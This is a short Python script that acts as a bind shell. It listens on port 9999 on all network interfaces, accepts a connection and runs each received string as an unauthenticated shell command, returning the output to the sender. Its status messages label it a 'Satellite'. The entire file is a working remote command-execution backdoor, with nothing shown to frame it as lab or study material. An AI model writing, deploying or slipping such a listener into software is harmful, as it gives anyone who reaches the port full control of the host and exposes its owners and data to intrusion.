import socket
import subprocess

HOST = '0.0.0.0'     # Listen on all interfaces
PORT = 9999          # Port to listen on

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[+] Satellite (TCP) listening on {HOST}:{PORT}")

conn, addr = server.accept()
print(f"[+] Connection established from {addr}")

with conn:
    while True:
        data = conn.recv(4096)
        if not data:
            break

        command = data.decode().strip()
        print(f"[+] Received command: {command}")

        if command.lower() in ['exit', 'quit']:
            print("[!] Shutting down on command.")
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
            response = output.decode()
        except subprocess.CalledProcessError as e:
            response = e.output.decode()
        except Exception as ex:
            response = f"Error: {str(ex)}"

        conn.sendall(response.encode())

server.close()
